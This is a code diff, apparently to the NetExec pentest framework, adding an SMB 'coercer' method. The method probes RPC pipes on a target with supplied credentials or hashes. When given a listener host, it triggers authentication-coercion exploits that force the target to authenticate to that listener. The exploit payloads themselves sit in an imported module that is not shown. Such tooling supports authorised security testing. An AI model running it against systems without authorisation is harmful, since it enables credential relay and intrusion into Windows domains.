@@ -57,6 +57,7 @@ from nxc.helpers.bloodhound import add_user_bh
 from nxc.helpers.powershell import create_ps_command
 from nxc.helpers.misc import detect_if_ip
 from nxc.protocols.ldap.resolution import LDAPResolution
+from nxc.protocols.smb.coercer import Coercer
 
 from dploot.triage.vaults import VaultsTriage
 from dploot.triage.browser import BrowserTriage, LoginData, GoogleRefreshToken, Cookie
@@ -2001,3 +2002,58 @@ class smb(connection):
 
     def mark_guest(self):
         return highlight(f"{highlight('(Guest)')}" if self.is_guest else "")
+    
+    def coercer(self):
+        # Reason why we don't use SMBTransport function, because timeout in that function was hard-coding as 30 seconds
+        # And SMBTransport did samething in dcerpc connect
+        # https://github.com/fortra/impacket/blob/master/impacket/dcerpc/v5/transport.py#L497
+
+        from nxc.loaders.moduleloader import ModuleLoader
+        from os.path import dirname
+        from os.path import join as path_join
+        import nxc
+        method_paths = [
+            path_join(dirname(nxc.__file__), "data", "coercer_method"),
+            path_join(NXC_PATH, "data", "coercer_method"),
+        ]
+        method_modules = ModuleLoader.load_all_modules_from_subdirs(method_paths)
+
+        Coercer_ = Coercer(self.logger, self.args.coercer_timeout, method_modules)
+        protocol_config, aliasName = Coercer_.config()
+        for ms_protocolName, coerce_methods in protocol_config.items():
+            accessible_Pipe = []
+            for coerce_method in coerce_methods:
+                try:
+                    dce = Coercer_.connect(
+                        target=self.remoteName,
+                        username=self.username,
+                        password=self.password,
+                        domain=self.domain,
+                        lmhash=self.lmhash,
+                        nthash=self.nthash,
+                        target_ip=self.host,
+                        doKerberos=self.kerberos,
+                        dcHost=self.kdcHost,
+                        aesKey=self.aesKey,
+                        coerce_method=coerce_method
+                    )
+                    if dce is not None:
+                        accessible_Pipe.append(coerce_method["pipeName"])
+                        if self.args.coercer_listener is not None: # Do exploit
+                            Coercer_.exploit(
+                                dce=dce,
+                                target=self.remoteName,
+                                listener=self.args.coercer_listener,
+                                always_continue=True,
+                                ms_protocolName=ms_protocolName,
+                                exploitName=aliasName[ms_protocolName],
+                                pipeName=coerce_method["pipeName"]
+                            )
+                        dce.disconnect()
+                    else:
+                        self.logger.debug(f'{ms_protocolName}: PIPE: {coerce_method["pipeName"]} is not accessible on target: {self.remoteName}')
+                except Exception as e:
+                    self.logger.error(f"Error: {e}")
+
+            if accessible_Pipe:
+                self.logger.highlight(f'{aliasName[ms_protocolName]}: Accessible PIPE: {accessible_Pipe}')
